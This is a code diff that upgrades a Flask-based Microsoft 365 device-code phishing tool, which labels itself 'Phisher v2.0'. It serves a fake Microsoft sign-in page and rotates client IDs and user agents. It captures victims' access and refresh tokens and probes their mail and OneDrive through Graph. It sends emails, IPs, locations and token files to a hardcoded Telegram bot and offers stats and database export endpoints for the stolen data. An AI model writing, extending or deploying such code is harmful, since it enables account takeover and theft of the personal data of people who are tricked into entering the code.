@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, send_file, url_for, render_template_string
+from flask import Flask, request, redirect, send_file, url_for, render_template_string, jsonify
 import sqlite3
 import datetime
 import json
@@ -7,20 +7,26 @@ import secrets
 import os
 import time
 import threading
+import shutil
+import random
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(32)
 
 DB_NAME = "device_logs.db"
+HTML_PATH = "index.html"
 
 TELEGRAM_BOT_TOKEN = "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k"
 TELEGRAM_CHAT_ID = "8689962848"
 
-# Microsoft Device Code endpoints
+CLIENT_IDS = [
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Azure CLI
+    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Visual Studio
+    "872cd9fa-d31c-45c9-824e-b321b0e850cc",  # Power BI
+]
+
 DEVICE_CODE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
 TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
-
-CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office / Azure CLI client (very common)
 
 def init_db():
     conn = sqlite3.connect(DB_NAME)
@@ -37,6 +43,7 @@ def init_db():
                  ip TEXT,
                  location TEXT,
                  ua TEXT,
+                 client_id TEXT,
                  success INTEGER)''')
     conn.commit()
     conn.close()
@@ -60,6 +67,14 @@ def get_location(ip):
         pass
     return {"city": "Unknown", "country": "Unknown"}
 
+def get_random_ua():
+    uas = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
+    ]
+    return random.choice(uas)
+
 def send_telegram_message(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -72,39 +87,62 @@ def send_telegram_document(filename, caption):
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         with open(filename, 'rb') as f:
             requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, timeout=30)
+        os.remove(filename)
     except:
         pass
 
-def poll_for_tokens(device_code, user_code, ip, location, ua, max_attempts=60):
-    """Background thread that polls Microsoft for token"""
+def test_token_capabilities(access_token, email):
+    headers = {'Authorization': f'Bearer {access_token}'}
+    tests = [
+        ('me', 'Profile'),
+        ('me/mailFolders/Inbox/messages?$top=1', 'Email'),
+        ('me/drive/root/children?$top=1', 'OneDrive')
+    ]
+    
+    results = []
+    for endpoint, name in tests:
+        try:
+            r = requests.get(f"https://graph.microsoft.com/v1.0/{endpoint}", headers=headers, timeout=10)
+            if r.status_code == 200:
+                results.append(f"✅ {name}")
+        except:
+            pass
+    
+    if results:
+        send_telegram_message(f"🎯 <b>{email}</b> access: {' | '.join(results)}")
+
+def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_attempts=60):
     data = {
-        'client_id': CLIENT_ID,
+        'client_id': client_id,
         'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
         'device_code': device_code
     }
 
     for attempt in range(max_attempts):
         try:
-            resp = requests.post(TOKEN_URL, data=data, timeout=15)
+            headers = {'User-Agent': get_random_ua()}
+            resp = requests.post(TOKEN_URL, data=data, headers=headers, timeout=15)
             result = resp.json()
 
             if 'access_token' in result:
-                # SUCCESS - Tokens received
-                email = result.get('id_token_claims', {}).get('email') or result.get('id_token_claims', {}).get('preferred_username') or "Unknown"
+                email = (result.get('id_token_claims', {}).get('email') or 
+                        result.get('id_token_claims', {}).get('preferred_username') or "Unknown")
 
                 success_msg = f"""
-🔥 <b>Microsoft Device Code SUCCESS!</b> 🔥
+🔥 <b>Microsoft SUCCESS!</b> 🔥
 
 👤 <code>{email}</code>
-🔑 User Code: <code>{user_code}</code>
+🔢 <code>{user_code}</code>
 
 🌐 {ip} — {location.get('city')}, {location.get('country')}
 🕒 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-                """
 
+<b>Tokens captured!</b>
+                """
                 send_telegram_message(success_msg)
 
-                # Save full tokens to JSON
+                threading.Thread(target=test_token_capabilities, args=(result.get('access_token'), email), daemon=True).start()
+
                 token_data = {
                     'timestamp': datetime.datetime.now().isoformat(),
                     'email': email,
@@ -115,120 +153,161 @@ def poll_for_tokens(device_code, user_code, ip, location, ua, max_attempts=60):
                     'scope': result.get('scope'),
                     'ip': ip,
                     'location': location,
-                    'ua': ua
+                    'ua': ua,
+                    'client_id': client_id
                 }
 
-                filename = f"device_success_{email.split('@')[0]}_{int(time.time())}.json"
+                filename = f"tokens_{email.split('@')[0]}_{int(time.time())}.json"
                 with open(filename, 'w') as f:
                     json.dump(token_data, f, indent=2)
+                send_telegram_document(filename, f"✅ Tokens: {email}")
 
-                send_telegram_document(filename, f"✅ Device Code Success - {email}")
-                os.remove(filename)
-
-                # Save to DB
                 conn = sqlite3.connect(DB_NAME)
                 conn.execute("""INSERT INTO device_captures 
-                    (timestamp, user_code, device_code, email, access_token, refresh_token, expires_in, ip, location, ua, success)
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                    (timestamp, user_code, device_code, email, access_token, refresh_token, expires_in, ip, location, ua, client_id, success)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                     (datetime.datetime.now().isoformat(), user_code, device_code, email,
                      result.get('access_token'), result.get('refresh_token'), result.get('expires_in'),
-                     ip, json.dumps(location), ua, 1))
+                     ip, json.dumps(location), ua, client_id, 1))
                 conn.commit()
                 conn.close()
 
-                print(f"✅ DEVICE CODE SUCCESS: {email}")
+                print(f"✅ SUCCESS: {email} -> {filename}")
                 return
 
             elif result.get('error') == 'authorization_pending':
-                time.sleep(5)  # Microsoft recommends polling every 5 seconds
+                time.sleep(5)
                 continue
             elif result.get('error') == 'expired_token':
-                print(f"❌ Device code expired for {user_code}")
-                return
-            else:
-                print(f"Device code error: {result.get('error_description')}")
+                print(f"❌ Expired: {user_code}")
                 return
 
         except Exception as e:
-            print(f"Polling error: {e}")
             time.sleep(5)
 
-    print(f"❌ Polling timeout for user code {user_code}")
+    print(f"❌ Timeout: {user_code}")
 
 @app.route('/')
 def index():
-    return send_file('index.html')  # You can create a convincing "Sign in with Microsoft" page
+    if os.path.exists(HTML_PATH):
+        return send_file(HTML_PATH)
+    return send_file('index.html')
 
 @app.route('/start', methods=['POST'])
 def start_device_flow():
     ip = get_client_ip()
     ua = request.headers.get('User-Agent', '')
     location = get_location(ip)
+    client_id = random.choice(CLIENT_IDS)
 
     try:
-        # Request device code from Microsoft
         payload = {
-            'client_id': CLIENT_ID,
+            'client_id': client_id,
             'scope': 'openid profile offline_access https://graph.microsoft.com/.default'
         }
 
-        resp = requests.post(DEVICE_CODE_URL, data=payload, timeout=15)
+        resp = requests.post(DEVICE_CODE_URL, data=payload, timeout=15, headers={'User-Agent': get_random_ua()})
         data = resp.json()
 
         user_code = data.get('user_code')
         device_code = data.get('device_code')
         verification_uri = data.get('verification_uri')
-        expires_in = data.get('expires_in', 900)
 
         if not user_code or not device_code:
-            return "Error initiating device flow", 500
+            return "Error", 500
 
         message = f"""
-📱 <b>New Microsoft Device Code Request</b>
+📱 <b>New Device Code</b>
 
-🔢 User Code: <code>{user_code}</code>
-🔗 Link: <a href="{verification_uri}">{verification_uri}</a>
+🔢 <code>{user_code}</code>
+🔗 <a href="{verification_uri}">{verification_uri}</a>
 
-🌐 {ip} — {location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}
+🌐 {ip} — {location.get('city')}, {location.get('country')}
 🕒 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
         """
         send_telegram_message(message)
 
-        # Start polling in background thread
-        threading.Thread(target=poll_for_tokens, args=(device_code, user_code, ip, location, ua), daemon=True).start()
+        threading.Thread(target=poll_for_tokens, args=(device_code, user_code, ip, location, ua, client_id), daemon=True).start()
 
-        # Show nice waiting page with the code
         return render_template_string('''
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Sign in to Microsoft</title>
-    <style>
-        body { font-family: Segoe UI, sans-serif; background: #f3f2f1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 420px; text-align: center; }
-        .code { font-size: 42px; letter-spacing: 8px; font-weight: bold; background: #f8f8f8; padding: 20px; border-radius: 8px; margin: 20px 0; }
-        .logo { width: 100px; margin-bottom: 20px; }
-    </style>
-</head>
-<body>
-<div class="card">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
-    <h2>Sign in to your Microsoft account</h2>
-    <p>Open this page on another device and enter the code below:</p>
-    <div class="code">{{ user_code }}</div>
-    <p><strong>{{ verification_uri }}</strong></p>
-    <p style="color:#666; font-size:14px;">This code will expire in 15 minutes.</p>
-</div>
-</body>
-</html>
+<html><head><title>Microsoft - Enter code</title>
+<style>body{font-family:Segoe UI,sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}
+.card{background:white;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:420px;text-align:center;}
+.code{font-size:42px;letter-spacing:8px;font-weight:700;background:#f8f8f8;padding:20px;border-radius:8px;margin:20px 0;}
+.logo{width:100px;margin-bottom:20px;}</style></head>
+<body><div class="card">
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+<h2>Enter this code</h2><p>Go to <strong>microsoft.com/devicelogin</strong> and enter:</p>
+<div class="code">{{ user_code }}</div>
+<p style="font-size:14px;"><strong>{{ verification_uri }}</strong></p>
+<p style="color:#666;font-size:14px;">Expires in 15 minutes</p>
+</div></body></html>
         ''', user_code=user_code, verification_uri=verification_uri)
 
     except Exception as e:
-        print(f"Device code initiation failed: {e}")
+        print(f"Error: {e}")
         return redirect(url_for('index'))
 
+@app.route('/stats')
+def stats():
+    conn = sqlite3.connect(DB_NAME)
+    total = conn.execute("SELECT COUNT(*) FROM device_captures").fetchone()[0]
+    success = conn.execute("SELECT COUNT(*) FROM device_captures WHERE success=1").fetchone()[0]
+    recent = conn.execute("SELECT * FROM device_captures ORDER BY timestamp DESC LIMIT 5").fetchall()
+    conn.close()
+    
+    stats = {
+        'total': total,
+        'success': success,
+        'success_rate': round((success/total*100), 1) if total else 0,
+        'recent': []
+    }
+    
+    for row in recent:
+        stats['recent'].append({
+            'email': row[4],
+            'ip': row[8],
+            'timestamp': row[1],
+            'success': bool(row[12])
+        })
+    
+    return jsonify(stats)
+
+@app.route('/db')
+def download_db():
+    return send_file(DB_NAME, as_attachment=True, download_name="device_captures.json")
+
+@app.route('/export')
+def export_json():
+    """Export ALL captures as JSON"""
+    conn = sqlite3.connect(DB_NAME)
+    rows = conn.execute("SELECT * FROM device_captures ORDER BY timestamp DESC").fetchall()
+    conn.close()
+    
+    data = []
+    for row in rows:
+        data.append({
+            'id': row[0],
+            'timestamp': row[1],
+            'user_code': row[2],
+            'device_code': row[3],
+            'email': row[4],
+            'access_token': row[5][:50] + '...' if row[5] else None,
+            'refresh_token': row[6][:50] + '...' if row[6] else None,
+            'ip': row[8],
+            'success': bool(row[12])
+        })
+    
+    response = jsonify({'captures': data})
+    response.headers["Content-Disposition"] = "attachment; filename=captures_export.json"
+    return response
+
 if __name__ == '__main__':
-    print("🚀 Microsoft Device Code Phisher Started (2026 Version)")
-    print("📱 Visit: http://0.0.0.0:5000/")
+    print("🚀 M365 Device Code Phisher v2.0")
+    print("📱 http://0.0.0.0:5000/           # Landing page")
+    print("📊 http://0.0.0.0:5000/stats      # Live stats JSON")
+    print("💾 http://0.0.0.0:5000/db         # Full DB download")
+    print("📤 http://0.0.0.0:5000/export     # JSON export")
+    print(f"🗄️  DB: {DB_NAME}")
     app.run(host='0.0.0.0', port=5000, debug=False)
